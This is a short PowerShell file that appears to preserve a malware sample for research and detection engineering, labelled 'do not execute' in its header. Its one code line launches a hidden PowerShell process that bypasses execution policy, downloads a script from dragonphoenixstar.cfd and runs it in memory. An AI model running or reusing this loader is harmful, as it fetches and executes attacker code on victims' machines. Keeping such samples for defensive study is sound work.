<#
    ============================================================
    !!! MALICIOUS SCRIPT - DO NOT EXECUTE !!!
    Recovered as-is from dragonphoenixstar.cfd/<per-victim-token>
    Kept for research / detection-engineering purposes only.
    See ../analysis/01-initial-access.md for full context.
    ============================================================
#>

Start-Process powershell -ArgumentList '-NoP -Exec Bypass -Command "$a=irm ''dragonphoenixstar.cfd/1YLO2qTafmdBm3CqwH'';$h=@{ScriptBlock=[ScriptBlock]::Create($a);Name=''c''};New-Module @h|Out-Null;exit"' -WindowStyle Hidden
